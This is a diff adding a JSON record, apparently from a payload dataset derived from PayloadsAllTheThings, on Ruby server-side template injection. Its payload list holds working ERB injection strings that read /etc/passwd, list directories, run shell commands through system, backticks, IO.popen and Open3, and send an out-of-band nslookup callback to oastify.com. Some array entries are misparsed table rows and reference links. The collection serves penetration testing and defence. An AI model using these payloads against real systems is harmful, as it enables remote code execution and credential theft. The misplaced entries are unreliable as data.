@@ -1,0 +1,26 @@
+{
+  "id": "rce-17ae040adfb1",
+  "category": "RCE",
+  "title": "Ruby",
+  "description": "# Server Side Template Injection - Ruby\n\n> Server-Side Template Injection (SSTI)  is a vulnerability that arises when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In Ruby, SSTI can occur when using templating engines like ERB (Embedded Ruby), Haml, liquid, or Slim, especially when user input is incorporated into templates without proper sanitization or validation.\n\n## Summary\n\n- [Templating Libraries](#templating-libraries)\n",
+  "payloads": [
+    "| Erb           | `<%= %>`       |",
+    "| Erubi         | `<%= %>`       |",
+    "| Erubis        | `<%= %>`       |",
+    "<%= 7 * 7 %>",
+    "<%= File.open('/etc/passwd').read %>",
+    "<%= Dir.entries('/') %>",
+    "<%=(`nslookup oastify.com`)%>",
+    "<%= system('cat /etc/passwd') %>",
+    "<%= `ls /` %>",
+    "<%= IO.popen('ls /').readlines()  %>",
+    "<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>",
+    "<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>",
+    "- [Ruby ERB Template Injection - Scott White & Geoff Walton - September 13, 2017](https://web.archive.org/web/20181119170413/https://www.trustedsec.com/2017/09/rubyerb-template-injection/)",
+    "- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 03, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)"
+  ],
+  "references": [
+    "PayloadsAllTheThings/Server Side Template Injection/Ruby.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
